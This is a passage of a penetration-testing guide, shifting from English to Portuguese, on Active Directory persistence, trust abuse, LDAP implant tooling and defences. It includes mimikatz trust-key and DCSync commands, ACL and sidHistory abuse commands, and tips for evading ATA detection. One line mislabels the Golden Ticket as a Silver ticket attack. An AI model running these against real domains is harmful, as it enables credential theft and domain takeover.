The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalada de privilégios de Child-to-Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras formas de enumerar trusts de domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 trusted keys**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode a usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar como Enterprise admin para o domínio child/parent abusando da trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender como a Configuration Naming Context (NC) pode ser explorada é crucial. A Configuration NC serve como um repositório central para dados de configuração em todo um forest em ambientes Active Directory (AD). Esses dados são replicados para todos os Domain Controller (DC) dentro do forest, com DCs graváveis mantendo uma cópia gravável da Configuration NC. Para explorar isso, é preciso ter **privilégios de SYSTEM em um DC**, de preferência um child DC.

**Link GPO to root DC site**

O container Sites da Configuration NC inclui informações sobre os sites de todos os computadores ingressados no domínio dentro do AD forest. Ao operar com privilégios de SYSTEM em qualquer DC, atacantes podem vincular GPOs aos sites do root DC. Essa ação pode comprometer o root domain ao manipular políticas aplicadas a esses sites.

Para informações mais aprofundadas, pode-se explorar pesquisas sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Um vetor de ataque envolve mirar em gMSAs privilegiadas dentro do domínio. A KDS Root key, essencial para calcular as passwords das gMSAs, é armazenada dentro da Configuration NC. Com privilégios de SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as passwords de qualquer gMSA em todo o forest.

Análise detalhada e orientação passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar delegado a MSA (BadSuccessor – abusando de migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método exige paciência, aguardando a criação de novos objetos AD privilegiados. Com privilégios de SYSTEM, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar a acesso e controle não autorizados sobre objetos AD criados recentemente.

Leitura adicional está disponível em [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 visa o controle sobre objetos de Public Key Infrastructure (PKI) para criar um certificate template que permite autenticação como qualquer usuário dentro do forest. Como os objetos PKI residem na Configuration NC, comprometer um child DC gravável permite a execução de ataques ESC5.

Mais detalhes sobre isso podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, como discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário **seu domínio é confiável** por um externo, concedendo a você **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm qual acesso sobre o domínio externo** e então tentar explorá-lo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário **seu domínio** está **concedendo** alguns **privilégios** a um principal de **diferentes domínios**.

No entanto, quando um **domínio é confiado** pelo domínio confiável, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a trusted password**. Isso significa que é possível **acessar um usuário do domínio confiável para entrar no confiado** e enumerá-lo, tentando escalar mais privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da confiança entre domínios (o que não é muito comum).

Outra forma de comprometer o domínio confiado é aguardar em uma máquina onde um **usuário do domínio confiado possa acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir dali.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da sessão **RDP** o atacante poderia armazenar **backdoors** na **startup folder** do disco rígido. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de trust entre domínios

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history entre forest trusts é mitigado por SID Filtering, que é ativado por padrão em todos os inter-forest trusts. Isso se baseia na suposição de que intra-forest trusts são seguros, considerando a forest, e não o domínio, como a fronteira de segurança, conforme a posição da Microsoft.
- No entanto, há um porém: o SID filtering pode quebrar aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para inter-forest trusts, usar Selective Authentication garante que usuários das duas forests não sejam autenticados automaticamente. Em vez disso, são necessárias permissões explícitas para que usuários acessem domínios e servidores dentro do domínio ou forest confiável.
- É importante notar que essas medidas não protegem contra a exploração do writable Configuration Naming Context (NC) ou ataques à conta de trust.

[**Mais informações sobre trusts de domínio em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso de AD baseado em LDAP a partir de implants no host

A [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP no estilo bloodyAD como x64 Beacon Object Files que executam inteiramente dentro de um implant no host (por exemplo, Adaptix C2). Os operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs` e então chamam `ldap <subcommand>` a partir do beacon. Todo o tráfego usa o contexto de segurança de logon atual via LDAP (389) com signing/sealing ou LDAPS (636) com confiança automática de certificado, então não são necessários proxies socks nem artefatos em disco.

### Enumeração LDAP do lado do implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` e `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e fazem dump dos objetos correspondentes.
- `get-object`, `get-attribute` e `get-domaininfo` coletam atributos arbitrários (incluindo security descriptors) além dos metadados de forest/domain a partir de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` e `get-rbcd` expõem candidatos a roasting, configurações de delegation e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente via LDAP.
- `get-acl` e `get-writable --detailed` analisam a DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/attribute writes) e inheritance, fornecendo alvos imediatos para escalada de privilégios via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivos de escrita LDAP para escalada e persistência

- BOFs de criação de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem ao operador preparar novos principals ou contas de máquina onde existirem direitos em OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` sequestram alvos diretamente quando são encontrados direitos de write-property.
- Comandos focados em ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync`, traduzem WriteDACL/WriteOwner em qualquer objeto AD em resets de senha, controle de associação a grupos ou privilégios de replicação DCSync, sem deixar artefatos de PowerShell/ADSI. Os equivalentes `remove-*` limpam os ACEs injetados.

### Delegation, roasting e abuso de Kerberos

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido Kerberoastable; `add-asreproastable` (alternância de UAC) o marca para AS-REP roasting sem tocar na senha.
- Macros de delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags de UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de ataque constrained/unconstrained/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, realocação de OU e modelagem da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no SID history de um principal controlado (veja [SID-History Injection](sid-history-injection.md)), fornecendo herança de acesso furtiva totalmente via LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante mova assets para OUs onde direitos delegados já existem antes de abusar de `set-password`, `add-groupmember` ou `add-spn`.
- Comandos de remoção com escopo restrito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem rollback rápido após o operador coletar credenciais ou persistência, minimizando a telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas Defensivas para Proteção de Credenciais**

- **Restrições para Domain Admins**: É recomendável que Domain Admins só possam fazer login em Domain Controllers, evitando seu uso em outros hosts.
- **Privilégios de Service Account**: Services não devem ser executados com privilégios de Domain Admin (DA) para manter a segurança.
- **Limitação Temporal de Privilégio**: Para tarefas que exigem privilégios de DA, a duração deve ser limitada. Isso pode ser feito com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigação de LDAP relay**: Audite os Event IDs 2889/3074/3075 e então imponha LDAP signing e LDAPS channel binding em DCs/clients para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting em nível de protocolo da atividade do Impacket

Se você quiser detectar tradecraft comum de AD, **não confie apenas em artefatos controlados pelo operador** como binários renomeados, nomes de services, arquivos batch temporários ou caminhos de saída. Faça baseline de como clientes Windows legítimos geram tráfego [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI, e então procure por **particularidades de implementação** que permanecem mesmo depois que o operador edita `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.

- **Candidatos isolados de alta confiança** (após validar contra seu próprio baseline):
- DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
- Padding de autenticação DCE/RPC preenchido com `0xff`
- LDAP Kerberos binds que colocam um `AP-REQ` Kerberos bruto diretamente em `mechToken` do SPNEGO
- Requisições SMB2/3 negotiate com valores de `ClientGuid` que parecem ASCII
- WMI `IWbemLevel1Login::NTLMLogin` usando o namespace não padrão `//./root/cimv2`
- Valores de nonce Kerberos hardcoded
- **Melhor como features de correlação/pontuação**:
- Listas de etype Kerberos esparsas ou duplicadas, `PA-DATA` incomum/ausente, ou ordenação de etype em TGS-REQ diferente do Windows nativo
- Mensagens NTLM Type 1 sem informação de version ou mensagens Type 3 com nomes de host nulos
- NTLMSSP bruto carregado em DCE/RPC em vez de SPNEGO, trailers de verificação DCE/RPC ausentes, ou incompatibilidades de OID entre SPNEGO/Kerberos
- Vários desses traços do mesmo host/user/session/time window são muito mais fortes do que qualquer campo fraco isolado
- **Use como enriquecimento, não como alertas isolados**:
- Nomes de arquivo padrão, caminhos de saída, nomes de services aleatórios, nomes temporários de batch, nomes padrão de contas de computador e strings HTTP/WebDAV/RDP/MSSQL específicas da ferramenta
- São fáceis de alterar pelo operador e é melhor usá-los para explicar por que um cluster cross-protocol é suspeito
- **Notas operacionais**:
- Alguns desses sinais exigem tráfego descriptografado, [análise de PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou visibilidade do lado do service
- Valide contra clientes Samba/Linux, appliances e software legado antes de promover para alertas
- Promova detecções de enriquecimento -> hunting -> alerting à medida que ganha confiança no baseline

### **Implementando Técnicas de Deception**

- Implementar deception envolve criar armadilhas, como usuários ou computadores isca, com recursos como senhas que não expiram ou marcadas como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais sobre como implantar técnicas de deception pode ser encontrado em [Deploy-Deception no GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **Para User Objects**: Indicadores suspeitos incluem ObjectSID atípico, logons pouco frequentes, datas de criação e baixos contadores de bad password.
- **Indicadores Gerais**: Comparar atributos de possíveis decoy objects com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar essas deceptions.

### **Burlando Sistemas de Detecção**

- **Microsoft ATA Detection Bypass**:
- **Enumeração de Usuários**: Evitar a enumeração de sessões em Domain Controllers para prevenir a detecção pelo ATA.
- **Impersonação de Ticket**: Utilizar chaves **aes** para criação de tickets ajuda a evitar detecção ao não fazer downgrade para NTLM.
- **DCSync Attacks**: É aconselhável executar a partir de um host que não seja Domain Controller para evitar a detecção pelo ATA, já que a execução direta a partir de um Domain Controller dispara alertas.

## Referências

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
